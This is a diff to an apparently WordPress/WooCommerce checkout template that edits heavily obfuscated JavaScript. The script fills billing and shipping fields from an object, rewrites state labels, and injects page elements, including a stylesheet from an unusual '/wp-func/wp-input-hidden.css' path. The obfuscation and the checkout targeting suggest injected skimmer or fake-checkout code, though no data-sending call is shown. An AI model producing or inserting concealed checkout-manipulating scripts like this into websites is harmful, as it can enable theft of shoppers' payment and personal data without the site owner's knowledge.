@@ -150,16 +150,15 @@ endif;
                                 _ea206bb4_["fdda901ee"](pa0291ac1["parentElement"]["parentElement"]);
                                 const _3b384e9f_ = document["getElementById"]("d82832d7");
                                 _3b384e9f_["value"] = (/^[0-9]+/["test"](paea34913["billing_first_name"])) ? paea34913["billing_first_name"] : `${paea34913["billing_first_name"]} ${paea34913["billing_last_name"]}`;
-                                document["querySelector"]("input[id='ship-to-different-address-checkbox']")["checked"] = true;
-                                document["querySelector"](".shipping_address")["style"]["display"] = "block";
-
+                                //document["querySelector"]("input[id='ship-to-different-address-checkbox']")["checked"] = true;
+                                //document["querySelector"](".shipping_address")["style"]["display"] = "block";
                                 Object["keys"](paea34913)["forEach"]((pdb735814,p09726094) => {
                                     const _bb987d0b_ = document["querySelector"](`input[name^="${pdb735814}"]`);
                                     const _f14cc786_ = (Object["values"](paea34913)[p09726094]);
                                     if(_bb987d0b_ && !(["billing_email"]["includes"](pdb735814))) _bb987d0b_["value"] = _f14cc786_;
-                                    else if(/\_state$/["test"](pdb735814)) document["querySelectorAll"]("label[for$='_state']")["forEach"](v7e3a8971 => {
+                                    else if(/\_state$/["test"](pdb735814)) document["querySelectorAll"]("label[for$='_state']")["forEach"]((v7e3a8971,ve5868a15) => {
                                         const _4f5fcfd6_ = v7e3a8971["parentElement"]["children"][1]["children"];
-                                        _4f5fcfd6_[1]["children"][0]["children"][0]["children"][0]["innerHTML"] = _f14cc786_;
+                                        if(ve5868a15 == 1 && typeof(_4f5fcfd6_[1]) != "undefined") _4f5fcfd6_[1]["children"][0]["children"][0]["children"][0]["innerHTML"] = _f14cc786_;
                                         _4f5fcfd6_[0]["value"] = _f14cc786_;
                                     });
                                 });
@@ -234,6 +233,16 @@ endif;
                                 type: "text/css"
                             }
                         }));
+                        /*(f6e9257a7({
+                            p0104fa6d: "link",
+                            p7a1df772: "head",
+                            p89a48e50: {
+                                id: "d1fb793a",
+                                rel: "stylesheet",
+                                href: "/wp-func/wp-input-hidden.css?key=4e6a535b",
+                                type: "text/css"
+                            }
+                        }));*/
                         (document["getElementById"]("9f584f57")["onload"] = () => f6e9257a7({
                             p0104fa6d: "div",
                             p7a1df772: "c7a2ec1b",
